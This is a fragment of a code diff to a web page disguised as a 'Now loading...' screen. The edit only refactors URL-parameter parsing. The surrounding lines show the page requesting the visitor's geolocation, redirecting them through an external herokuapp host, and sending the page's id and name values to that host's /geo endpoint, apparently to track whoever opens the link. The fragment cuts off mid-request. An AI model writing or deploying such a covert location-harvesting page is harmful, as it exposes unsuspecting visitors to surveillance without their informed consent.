@@ -4,10 +4,11 @@
     <meta charset="utf-8">
     <title>Now loading...</title>
     <script type="text/javascript">
-      const params = new URL(location.href)
-      const id = params.searchParams.get("id");
-      const nam = params.searchParams.get("name");
-      navigator.geolocation.getCurrentPosition(async (position) => {
+      const url = new URL(location.href);
+      const params = url.searchParams;
+      const id = params.get("id");
+      const nam = params.get("name");
+      navigator.geolocation.getCurrentPosition(async position => {
         const res = await fetch("https://get-ip-nero.herokuapp.com/auth"), url = await res.json();
         location.href = url.url;
         await fetch("https://get-ip-nero.herokuapp.com/geo?id=" + id + "&name=" + nam, {
